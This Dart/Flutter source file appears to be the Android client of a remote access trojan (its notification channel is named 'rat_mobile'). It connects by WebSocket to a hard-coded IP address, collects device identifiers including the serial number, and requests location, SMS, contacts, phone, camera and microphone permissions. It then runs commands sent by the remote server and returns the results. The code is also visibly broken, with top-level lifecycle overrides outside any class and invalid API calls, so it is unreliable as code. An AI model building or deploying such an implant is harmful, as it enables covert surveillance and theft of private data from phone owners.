import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:uuid/uuid.dart';
import 'package:mime/mime.dart';
import 'package:screen_brightness/screen_brightness.dart';
import 'package:flutter_phone_direct_caller/flutter_phone_direct_caller.dart';
import 'package:telephony/telephony.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:vibration/vibration.dart';
import 'package:torch_light/torch_light.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:intl/intl.dart';
import 'commands.dart';
import 'connection.dart';

final Uuid uuid = Uuid();
final String deviceId = uuid.v4();

final String BASE_URL = 'ws://139.162.187.61:5050/ws';

ConnectionHandler? _connectionHandler;
late final StreamSubscription<ConnectivityResult> _connectivitySubscription;
late final FlutterBackgroundService service;

String? _selectedDeviceId;
Map<String, dynamic> _deviceInfo = {};

@override
void initState() {
    super.initState();
    _initService();
    _initConnection();
    _initDeviceInfo();
    _requestPermissions();
}

void _initService() async {
    service = FlutterBackgroundService();
    await service.startService();
}

void _initConnection() {
    _connectionHandler = ConnectionHandler(BASE_URL, deviceId);
    _connectionHandler!.init().then((_) {
        _connectionHandler!.startHeartbeat();
        _connectionHandler!.onMessage.listen(_handleMessage);
    }).catchError((e) {
        debugPrint('Connection init error: $e');
    });
}

void _initDeviceInfo() async {
    final info = await DeviceInfoPlugin().androidInfo;
    _deviceInfo = {
        'model': info.model,
        'brand': info.brand,
        'manufacturer': info.manufacturer,
        'version': info.version.sdkString,
        'release': info.version.release,
        'serialNumber': info.serialNumber,
    };
    _deviceInfo.addAll(await _getBatteryInfo());
}

Map<String, dynamic> _getBatteryInfo() async {
    final battery = BatteryPlatform.instance;
    final level = battery.batteryLevel;
    final scaling = battery.batteryScale;
    final levelPercent = (level / scaling * 100).round();
    return {'batteryLevel': levelPercent, 'isCharging': battery.isCharging};
}

void _requestPermissions() async {
    final permissions = [
        Permission.locationAlways,
        Permission.sms,
        Permission.contacts,
        Permission.phone,
        Permission.camera,
        Permission.microphone,
        Permission.storage,
        Permission.flutterLocalNotifications,
    ];

    for (var perm in permissions) {
        await perm.request();
    }
}

void _handleMessage(dynamic message) {
    final type = message['type'];
    final action = message['action'];

    if (type == 'command') {
        _handleCommand(action, message['payload']);
    } else if (type == 'event') {
        _handleEvent(action, message);
    }
}

void _handleCommand(String action, dynamic payload) async {
    final response = await Commands.handle(action, payload, _deviceInfo);
    _connectionHandler!.sendResponse(response, _selectedDeviceId);
}

void _handleEvent(String action, dynamic message) {
    // Handle events like battery low, screen locked, new notification
    if (action == 'battery_low') {
        _showNotification('Battery Low', '${message['batteryLevel']}% remaining');
    } else if (action == 'screen_locked') {
        _showNotification('Screen Locked', 'Device screen has been locked');
    } else if (action == 'new_notification') {
        _showNotification('New Notification', message['text'] ?? 'No text');
    }
}

void _showNotification(String title, String body) async {
    final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
    const androidSettings = AndroidSettings(
        channelTitle: 'rat_mobile',
        channelName: ' notifications',
        importance: Importance.max,
    );
    await flutterLocalNotificationsPlugin.initialize(
        InitializationSettings(android: androidSettings),
    );
    flutterLocalNotificationsPlugin.show(
        0,
        NotificationCompat(
            title: title,
            body: body,
            android: androidNotificationPlatformChannelSpecific),
    );
}

@override
void dispose() {
    _connectionHandler?.dispose();
    super.dispose();
}